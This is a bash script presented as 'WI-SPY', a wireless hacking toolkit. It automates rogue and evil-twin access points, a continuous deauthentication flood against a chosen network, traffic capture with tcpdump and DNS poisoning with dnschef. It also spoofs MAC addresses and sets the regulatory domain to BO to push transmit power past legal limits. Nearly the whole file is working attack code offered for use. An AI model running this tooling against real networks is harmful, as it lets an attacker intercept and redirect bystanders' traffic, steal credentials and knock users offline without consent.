#!/bin/bash
#    Copyright (C) 2018 Prime Modz

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

AQUA="\e[36m"			
BOLD="\e[1m"
NORMAL="\e[0m"	
LIGHTBLUE="\e[94m" 				
LIGHTGREEN="\e[92m"
LIGHTRED="\e[91m"
LIGHTYELLOW="\e[93m"	
INFO=$LIGHTYELLOW 		
INTFACE=$LIGHTGREEN
WARN=$LIGHTRED 					

is_AP_running="false"
is_DHCP_running="false"
is_sniffer_running="false"
is_DNS_running="false"
AP_type="null"
IFACE="null"
WIFACE="null"
WIFACE_plus="null"
MIFACE="null"
TIFACE="null"
WCHAN="null"
check="fail"

trap bye INT		

function banner()
{
	echo -e "${LIGHTRED}
                66:::::'66:'6666::'666666::'66666666::'66:::'66:
                66:'66: 66:. 66::'66... 66: 66.... 66:. 66:'66::
                66: 66: 66:: 66:: 66:::..:: 66:::: 66::. 6666:::
                66: 66: 66:: 66:::.666666:: 66666666::::. 66::::
                66: 66: 66:: 66:::......66: 66.....:::::: 66::::
                66: 66: 66:: 66::'66::: 66: 66::::::::::: 66::::
               . 666. 666::'6666:. 666666:: 66::::::::::: 66::::
               :...::...:::....:::......:::..::::::::::::..:::::"
}

function copyright()
{
	echo -e "${LIGHTGREEN}
 	   {~~~}      The Wireless Hacking Toolkit(${LIGHTGREEN}WI-SPY${LIGHTGREEN})      {~~~}${LIGHTGREEN} 
 	   {~~~}        Created by: ${LIGHTRED}Eli Harju${LIGHTGREEN}(${LIGHTYELLOW}PrimeModz${LIGHTGREEN})        {~~~}  
	   {~~~}                   Version: ${LIGHTRED}4.20${LIGHTGREEN}                {~~~}
	   {~~~}                 Codename: ${LIGHTYELLOW}'Beta'${LIGHTGREEN}               {~~~}
	   {~~~}          Follow me on IG@: ${LIGHTRED}@root_primemodz${LIGHTGREEN}     {~~~}
	"
}

function main_menu()
{
	banner
	copyright

	echo -e "${NORMAL}Select from the menu:

	1)  Rogue access point
   	2)  Evil twin access point
   	3)  Display/hide DHCP leases
   	4)  Start/stop sniffing
	5)  Start/stop DNS poisonning (in Beta)
   	6)  Boost-up wireless card
   	99) Exit from WiSpy 
   	Press ctrl+c to escape at anytime${LIGHTRED}
	"
	read -p "wispy> " choice

	if [[ $choice = 1 ]];then
		clean_up > /dev/null
		set_up_intf
		AP_menu
		set_up_AP
		is_AP_running="true"
		reset
		main_menu

	elif [[ $choice = 2 ]];then
		clean_up > /dev/null
		set_up_intf
		eviltwin_menu
		set_up_eviltwin
		is_AP_running="true"
		reset
		main_menu

	elif [[ $choice = 3 ]];then
		if [[ $is_AP_running = "false" ]];then
			echo -e "${WARN}You first need to set up an access point you idiot!"
			sleep 4
			main_menu
		else
			if [[ $is_DHCP_running = "false" ]];then
				display_DHCP_leases
				reset
				main_menu
			else
				hide_DHCP_leases
				reset
				main_menu
			fi
		fi

	elif [[ $choice = 4 ]];then
		if [[ $is_AP_running = "false" ]];then
			echo -e "${WARN}You need first to set up an access point you idiot!"
			sleep 4
			main_menu
		else
			if [[ $is_sniffer_running = "false" ]];then
				start_sniffing
				reset
				main_menu
			else
				stop_sniffing
				reset
				main_menu
			fi
		fi

	elif [[ $choice = 5 ]];then
		if [[ $is_AP_running = "false" ]];then
			echo -e "${WARN}You need first to set up an access point you idiot!"
			sleep 4
			main_menu
		else
			if [[ $is_DNS_running = "false" ]];then
				start_DNS_poisonning
				reset
				main_menu
			else
				stop_DNS_poisonning
				reset
				main_menu
			fi
		fi

	elif [[ $choice = 6 ]];then
		boost_up_intf
		reset
		main_menu

	elif [[ $choice = 99 ]];then
		bye

	else
		reset
		main_menu
	fi
}

function set_up_intf()
{
	show_intf

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nInternet connected interface?${AQUA}"
 		read -p "wispy> " IFACE
 		
		check_device "$IFACE"
	done
	check="fail"

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nDo you want to change ${BOLD}$IFACE ${NORMAL}MAC address(can cause troubles)?(y/n)${AQUA}"
		read -p "wispy> " choice

		if [[ $choice = "y" ]];then
			echo -e "${INFO}[*] Macchanging $IFACE..."
			ip link set $IFACE down && macchanger -A $IFACE && ip link set $IFACE up
			echo -e "${WARN}If having problems, RESTART networking(/etc/init.d/network restart), or use wicd(wicd-client)."
			check="success"
		elif [[ $choice = "n" ]]; then
			check="success"
		else
			echo -e "${WARN}Type by yes(y) or no(n)!"
		fi
	done
	check="fail"

	# prevent wlan adapter soft blocking
	rfkill unblock wifi	
	show_w_intf

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nWireless interface to use to create the access point?${AQUA}"
 		read -p "wispy> " WIFACE

		check_device "$WIFACE"

		if [[ $WIFACE = $IFACE ]];then
			echo -e "${WARN}$IFACE is already in use, stupid. Try another inteface..."
			check="fail"
		fi
	done
	check="fail"

	# put the wireless interface in "monitor"
	echo -e "${INFO}\n[*] Starting monitor mode on ${BOLD}$WIFACE${NORMAL}${INFO}..."	
	ip link set $WIFACE down && iw dev $WIFACE set type monitor && ip link set $WIFACE up
	MIFACE=${WIFACE}
	# crucial, to let WIFACE come up before macchanging
	sleep 2	

	check_device "$MIFACE"
	if [[ $check = "fail" ]];then
		set_up_intf
	fi
	check="fail"

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nDo you want to change ${BOLD}$MIFACE ${NORMAL}MAC address(recommanded)?(y/n)${AQUA}"
	 	read -p "wispy> " choice

		if [[ $choice = "y" ]];then
			echo -e "${INFO}[*] Macchanging $MIFACE..."
			ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up
			check="success"
		elif [[ $choice = "n" ]]; then
			check="success"
		else
			echo -e "${WARN}Type by yes(y) or no(n)!"
		fi
	done
	check="fail"
}

function AP_menu()
{
echo -e "${NORMAL}
The ${BOLD}Blackhole ${NORMAL}access point type will respond to all probe requests (the access point may receive a lot of requests in crowded places - high charge).

The ${BOLD}Bullzeye ${NORMAL}access point type will respond only to the probe requests specifying the access point ESSID.

	1) Blackhole
   	2) Bullzeye
${AQUA}"

	while [[ $check = "fail" ]]
	do
 		read -p "wispy> " AP_type
		
		case $AP_type in 
			[1-2])
				check="success";;
        	*) 
				echo -e "${WARN}Type ${BOLD}Blackhole(1)${NORMAL}${WARN} or ${BOLD}Bullzeye(2)${NORMAL}${WARN}!\n${AQUA}"
				check="fail";;
		esac
	done
	check="fail"
}

function eviltwin_menu()
{
	echo -e "${NORMAL}
This attack consists in creating an evil copy of an access point and keep sending deauth packets to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID and wireless channel than the targeted access point.

To properly perform this attack the attacker should first check out all the in-range access point copy the BSSID, the ESSID and the channel of the target then create its twin
and finally deauthentificate all the clients from the righfully access point network so they may connect to ours. 
${AQUA}"
}

function set_up_AP()
{	
	echo -e "${NORMAL}\nAccess point ESSID?${AQUA}"
 	read -p "wispy> " ESSID

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nWireless channel to use(1-12)?${AQUA}"
 		read -p "wispy> " WCHAN

		case $WCHAN in 
			[1-9]|1[0-2])
				check="success";;
			*) 
				echo -e "${WARN}${BOLD}$WCHAN ${NORMAL}${WARN}is not a valid wireless channel, stupid."
				check="fail";;
		esac
	done
	check="fail"

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nAccess point WEP authentication?(y/n)${AQUA}"
	 	read -p "wispy> " choice
		
		if [[ $AP_type = 1 ]];then
			if [[ $choice = "y" ]];then
				echo -e "${NORMAL}Enter a valid WEP password(10 hexadecimal characters):${AQUA}"
	 			read -p "wispy> " WEP 
				
				xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P $MIFACE | tee ./conf/tmp 2> /dev/null" & 
				check="success"
			elif [[ $choice = "n" ]]; then
				xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MIFACE | tee ./conf/tmp 2> /dev/null" & 
				check="success"
			else
				echo -e "${WARN}Type yes(y) or no(n)!"
				check="fail"
			fi

		elif [[ $AP_type = 2 ]];then
			if [[ $choice = "y" ]];then
				echo -e "${NORMAL}Enter a valid WEP password(10 hexadecimal characters)${AQUA}"
	 			read -p "wispy> " WEP 
				
				xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MIFACE | tee ./conf/tmp 2> /dev/null" & 
				check="success"
			elif [[ $choice = "n" ]]; then
				xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MIFACE | tee ./conf/tmp 2> /dev/null" & 
				check="success"
			else
				echo -e "${WARN}Type yes(y) or no(n)!"
				check="fail"
			fi
		fi
	done
	check="fail"

	# crucial, to let TIFACE come up before setting it up
	sleep 2  				
	# storing the terminal pid					
	xterm_AP_PID=$(pgrep --newest Eterm) 		

	# extracting the tap interface
	TIFACE=$(cat ./conf/tmp| grep 'Created tap interface' | awk '{print $5}')

	check_device "$TIFACE"
	if [[ $check = "fail" ]];then
		echo -e "${WARN}An airbase-ng error occured(could not create the tap interface)."
		echo -e "${WARN}Hasta la vista, baby!"
		sleep 4
		bye
	fi

	set_up_iptables
	set_up_DHCP_srv
	
	echo -e "${INFO}\n[*] ${BOLD}$ESSID ${NORMAL}${INFO}is now running..."
	echo -e "${INFO}[*] Enjoy! >:)"
	sleep 6
}

function set_up_eviltwin()
{
	echo -e "${NORMAL}\nEvil twin ESSID?${AQUA}"
 	read -p "wispy> " eviltwin_ESSID

	echo -e "${NORMAL}\nEvil twin BSSID?${AQUA}"
	read -p "wispy> " eviltwin_BSSID

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nWireless channel to use(1-12)?(use the good twin wireless channel)${AQUA}"
 		read -p "wispy> " WCHAN

		case $WCHAN in 
			[1-9]|1[0-2])
				check="success";;
			*) 
				echo -e "${WARN}${BOLD}$WCHAN ${NORMAL}${WARN}is not a valid wireless channel, stupid."
				check="fail";;
		esac
	done
	check="fail"
	echo "$MIFACE"
	xterm -fg green -title "Evil Twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MIFACE | tee ./conf/tmp 2> /dev/null" & 
	
	sleep 4  								# crucial, to let TIFACE come up before setting it up	
	xterm_AP_PID=$(pgrep --newest Eterm)	# storing the terminal pid 

	# extracting the tap interface
	TIFACE=$(cat ./conf/tmp| grep 'Created tap interface' | awk '{print $5}')
	
	check_device "$TIFACE"
	if [[ $check = "fail" ]];then
		echo -e "${WARN}An airbase-ng error occured(could not create the tap interface)."
		echo -e "${WARN}Hasta la vista, baby!"
		sleep 4
		bye
	fi

	# de-auth the legit connected users
	xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID $MIFACE" & 
	xterm_aireplay_deauth=$(pgrep --newest xterm)

	set_up_iptables
	set_up_DHCP_srv
	
	echo -e "${INFO}[*] ${BOLD}$eviltwin_ESSID ${NORMAL}${INFO}is now running..."
	echo -e "${INFO}[*] Enjoy! >:)"
	sleep 6
}

function set_up_iptables()
{
	# cleaning the mess
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain

	# iptables rules
	iptables -P FORWARD ACCEPT
	# forward the traffic via the internet facing interface
	iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE 
}

function set_up_DHCP_srv()
{
	# enable ip forwarding
	echo "1" > /proc/sys/net/ipv4/ip_forward

	# setting up ip, route and stuff							
	ip link set $TIFACE up	
	# a bit of clean-up is always good!	
	ip addr flush dev $TIFACE				
	ip addr add 10.0.0.254/24 dev $TIFACE 
	
	# a bit of clean-up is always good!	
	ip route flush dev $TIFACE 				
	ip route add 10.0.0.0/24 via 10.0.0.254 dev $TIFACE

	# Reset any pre-existing dhcp leases
	cat /dev/null > /var/lib/dhcp/dhcpd.leases 
	cat /dev/null > /tmp/dhcpd.conf

	# Copy the conf file for the DHCP serv and change the isc-dhcp-server settings
	cp ./conf/dhcpd.conf /etc/dhcp/dhcpd.conf 
	sed -e s/INTERFACES=.*/INTERFACES=\"$TIFACE\"/ -i.bak /etc/default/isc-dhcp-server

	# Starting the DHCP service
	dhcpd -cf /etc/dhcp/dhcpd.conf $TIFACE &> /dev/null
	/etc/init.d/isc-dhcp-server restart &> /dev/null
}

function show_intf()
{
	echo -e "${INTFACE}\nAvailable interfaces:"
	for intf in $(ip -o link show | awk '{ print $2 }' | sed 's/.$//') # get the interfaces names
	do
		case ${intf} in 
			lo)
	        	continue;;
	        *)
				MAC=$(ip link show $intf | grep 'link/ether' | awk '{ print $2 }')
				echo -e "$intf:\t $MAC";;
	    esac
	done
}

function show_w_intf()
{
	echo -e "${INTFACE}\nAvailable wireless interfaces:"
	for intf in $(ip -o link show | grep -e "wlan*" | awk '{ print $2 }' | sed 's/.$//') # get the interfaces names
	do
		MAC=$(ip link show $intf | grep 'link/ether' | awk '{ print $2 }')
		echo -e "$intf:\t $MAC"
	done
}

function check_device() 
{
	if [[ $(ip link show $1 2> /dev/null) ]];then
		check="success"
	else
		echo -e "${WARN}Device ${BOLD}$1 ${NORMAL}${WARN}does NOT exist!"
		check="fail"
	fi
}  

function start_sniffing()
{
	xterm -fg green -title "tcpdump" -e "tcpdump -w ./logs/dump-$(date +%F::%T).cap -v -i $TIFACE" &
	is_sniffer_running="true"
}

function stop_sniffing()
{
	pkill tcpdump
	is_sniffer_running="false"
}

function start_DNS_poisonning()
{
	service apache2 start
	xterm -fg green -title "dsnchef" -e "dnschef -i $TIFACE -f ./conf/hosts" &
	xterm_sniff_PID=$(pgrep --newest xterm)
	is_DNS_running="true"
}

function stop_DNS_poisonning()
{
	service apache2 stop
	pkill dnsspoof
	is_DNS_running="false"
}

function display_DHCP_leases()
{
	xterm -fg green -title "DHCP Server" -e "tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null" &
	xterm_DHCP_PID=$(pgrep --newest xterm)
	is_DHCP_running="true"
}

function hide_DHCP_leases()
{
	pkill $xterm_DHCP_PID &> /dev/null
	is_DHCP_running="false"
}

function boost_up_intf()
{
	show_w_intf

	while [[ $check = "fail" ]]
	do
		echo -e "${NORMAL}\nWhich wireless interface do you want to boost up?${AQUA}"
 		read -p "wispy> " super_WIFACE

		check_device "$super_WIFACE"
	done
	check="fail"

	ip link set $super_WIFACE down && iw reg set BO && ip link set $super_WIFACE up 

	echo -e "${NORMAL}\nHow much do you want to boost the power of $super_WIFACE(up to 30dBm)?${AQUA}"
	read -p "wispy> " boost

	echo -e "${INFO}\n[*] $super_WIFACE powering up!"
	iw dev $super_WIFACE set txpower fixed ${boost}mBm
	sleep 4
}

function clean_up()
{
	echo -e "${INFO}\n[*] Killing processes..."
	hide_DHCP_leases && stop_sniffing && stop_DNS_poisonning
	killall airbase-ng airplay-ng &> /dev/null
	sleep 2
	sudo /etc/init.d/isc-dhcp-server start &> /dev/null
	sleep 2
	
	echo -e "${INFO}[*] Removing temporary files..."
	rm -df ./conf/tmp
	sleep 2

	check_device "$MIFACE" &> /dev/null
	if [[ $check = "success" ]];then
		echo -e "${INFO}[*] Starting managed mode on ${BOLD}$MIFACE${NORMAL}${INFO}..." 
		ip link set $MIFACE down && iw dev $MIFACE set type managed && ip link set $MIFACE up
		sleep 2
	fi
	check="fail"
}

function bye()
{
	clean_up
	reset
	exit
}

main_menu
